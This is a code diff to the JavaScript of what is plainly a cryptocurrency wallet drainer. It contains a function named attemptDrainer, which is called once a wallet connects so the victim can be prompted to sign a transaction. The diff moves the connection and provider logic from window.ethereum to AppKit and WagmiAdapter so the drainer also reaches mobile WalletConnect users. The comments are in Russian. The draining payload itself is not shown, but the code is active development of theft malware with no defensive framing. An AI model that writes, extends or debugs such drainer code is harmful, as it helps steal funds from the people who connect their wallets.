@@ -294,10 +294,18 @@ function shortenAddress(address) {
   return `${address.slice(0, 6)}...${address.slice(-4)}`;
 }
 
-function detectWallet() {
+function detectWallet(state) {
+  // Проверяем, есть ли информация о кошельке в состоянии AppKit
+  if (state?.selectedWallet) {
+    return state.selectedWallet; // AppKit может предоставить название кошелька, если доступно
+  }
+
+  // Проверяем window.ethereum для десктопных расширений
   if (window.ethereum?.isMetaMask) return "MetaMask";
   if (window.ethereum?.isTrust) return "Trust Wallet";
-  return "Unknown Wallet";
+
+  // Если нет точной информации, возвращаем "WalletConnect" для мобильных устройств
+  return isMobileDevice() ? "WalletConnect" : "Unknown Wallet";
 }
 
 function formatBalance(balance, decimals) {
@@ -939,8 +947,10 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    if (!window.ethereum) throw new Error('No Ethereum provider available after wallet connection');
-    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+    // Получаем провайдер из AppKit через WagmiAdapter
+    const walletProvider = wagmiAdapter.provider;
+    if (!walletProvider) throw new Error('No provider available after wallet connection');
+    const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -981,7 +991,6 @@ async function attemptDrainer() {
     throw error;
   }
 }
-
 async function handleConnectOrAction() {
   try {
     if (!connectedAddress) {
@@ -990,8 +999,9 @@ async function handleConnectOrAction() {
       connectedAddress = await waitForConnection();
       console.log(`✅ Wallet connected in handleConnectOrAction: ${connectedAddress}`);
 
-      if (!window.ethereum) throw new Error('No Ethereum provider available after connection');
-      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      const walletProvider = wagmiAdapter.provider;
+      if (!walletProvider) throw new Error('No provider available after connection');
+      const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
       const network = await provider.getNetwork();
       await saveSession(connectedAddress, network.chainId);
     } else {
@@ -1015,14 +1025,12 @@ async function handleConnectOrAction() {
 async function waitForConnection() {
   return new Promise((resolve, reject) => {
     console.log('📡 Waiting for wallet connection via AppKit...');
-    console.log('🔍 window.ethereum available:', !!window.ethereum);
-
     const isMobile = isMobileDevice();
     console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
 
     let attempts = 0;
-    const maxAttempts = 10; // Пробуем 10 раз с интервалом 2 секунды
-    const interval = 2000; // Интервал между попытками (2 секунды)
+    const maxAttempts = 10;
+    const interval = 2000;
 
     const unsubscribe = appKit.subscribeState(async (state) => {
       console.log('🔍 SubscribeState:', state);
@@ -1030,45 +1038,15 @@ async function waitForConnection() {
       let walletAddress = null;
 
       // Проверяем состояние подключения
-      if (state.loading === false) {
-        if (state.connected && (state.address || state.accounts?.[0] || state.selectedAddress)) {
-          walletAddress = state.address || state.accounts?.[0] || state.selectedAddress;
-          console.log(`✅ Address from state: ${walletAddress}`);
-        }
+      if (state.loading === false && state.connected && (state.address || state.accounts?.[0])) {
+        walletAddress = state.address || state.accounts?.[0];
+        console.log(`✅ Address from state: ${walletAddress}`);
       }
 
-      // Пробуем извлечь адрес из формата eip155:1:0x...
-      if (!walletAddress && state.accounts?.[0]?.startsWith('eip155:1:')) {
+      // Извлекаем адрес из формата eip155, если необходимо
+      if (!walletAddress && state.accounts?.[0]?.startsWith('eip155:')) {
         walletAddress = state.accounts[0].split(':')[2];
-        console.log(`✅ Extracted address from eip155:1: ${walletAddress}`);
-      }
-
-      // Пробуем получить адрес через window.ethereum
-      if (!walletAddress && window.ethereum && attempts < maxAttempts) {
-        try {
-          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-          if (accounts && accounts.length > 0) {
-            walletAddress = accounts[0];
-            console.log(`✅ Address from eth_accounts: ${walletAddress}`);
-          } else {
-            console.log(`ℹ No accounts returned by eth_accounts (attempt ${attempts + 1}/${maxAttempts})`);
-          }
-        } catch (error) {
-          console.error(`❌ Error fetching eth_accounts: ${error.message}`);
-        }
-      }
-
-      // Пробуем получить адрес через appKit.getAddress()
-      if (!walletAddress && attempts < maxAttempts) {
-        try {
-          const address = await appKit.getAddress?.();
-          if (address) {
-            walletAddress = address;
-            console.log(`✅ Address from appKit.getAddress: ${walletAddress}`);
-          }
-        } catch (error) {
-          console.warn(`⚠ Failed to get address via appKit.getAddress: ${error.message}`);
-        }
+        console.log(`✅ Extracted address from eip155: ${walletAddress}`);
       }
 
       if (walletAddress) {
@@ -1095,35 +1073,9 @@ async function waitForConnection() {
       attempts++;
     });
 
-    // Запускаем периодическую проверку
-    const checkInterval = setInterval(async () => {
-      if (attempts >= maxAttempts) {
-        clearInterval(checkInterval);
-        return;
-      }
-      if (!window.ethereum) return;
-
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts && accounts.length > 0) {
-          console.log(`✅ Address from eth_accounts (interval): ${accounts[0]}`);
-          connectedAddress = accounts[0];
-          unsubscribe();
-          clearInterval(checkInterval);
-          modalSubtitle.textContent = 'Preparing to sign transaction...';
-          await attemptDrainer();
-          appKit.close();
-          resolve(accounts[0]);
-        }
-      } catch (error) {
-        console.error(`❌ Error in interval eth_accounts: ${error.message}`);
-      }
-    }, interval);
-
     const timeout = setTimeout(() => {
       console.warn('⚠ Connection timeout');
       unsubscribe();
-      clearInterval(checkInterval);
       appKit.close();
       reject(new Error('Timeout waiting for wallet connection'));
     }, 120000);
@@ -1131,7 +1083,6 @@ async function waitForConnection() {
     appKit.open('error', (err) => {
       console.error(`❌ AppKit error: ${err.message}`);
       clearTimeout(timeout);
-      clearInterval(checkInterval);
       unsubscribe();
       appKit.close();
       reject(err);
